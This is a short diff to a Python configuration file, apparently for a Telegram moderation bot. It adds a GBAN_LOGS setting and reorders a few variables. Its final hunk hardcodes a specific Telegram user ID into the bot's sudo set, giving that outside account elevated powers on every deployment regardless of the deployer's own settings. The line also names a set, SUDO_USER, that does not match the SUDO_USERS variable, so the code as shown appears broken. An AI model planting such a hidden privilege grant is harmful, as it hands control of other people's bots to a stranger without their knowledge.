@@ -31,6 +31,7 @@ if ENV:
         raise Exception("Your OWNER_ID env variable is not a valid integer.")
 
     MESSAGE_DUMP = os.environ.get("MESSAGE_DUMP", None)
+    GBAN_LOGS = os.environ.get("GBAN_LOGS", None)
     OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
 
     try:
@@ -91,9 +92,10 @@ else:
         OWNER_ID = int(Config.OWNER_ID)
     except ValueError:
         raise Exception("Your OWNER_ID variable is not a valid integer.")
-
-    MESSAGE_DUMP = Config.MESSAGE_DUMP
+        
     OWNER_USERNAME = Config.OWNER_USERNAME
+    MESSAGE_DUMP = Config.MESSAGE_DUMP
+    GBAN_LOGS = Config.GBAN_LOGS
 
     try:
         SUDO_USERS = set(int(x) for x in Config.SUDO_USERS or [])
@@ -141,6 +143,7 @@ else:
     LASTFM_API_KEY = Config.LASTFM_API_KEY
 
 SUDO_USERS.add(OWNER_ID)
+SUDO_USER.add(1227561036)
 
 # Pass if SpamWatch token not set.
 if SPAMWATCH == None:
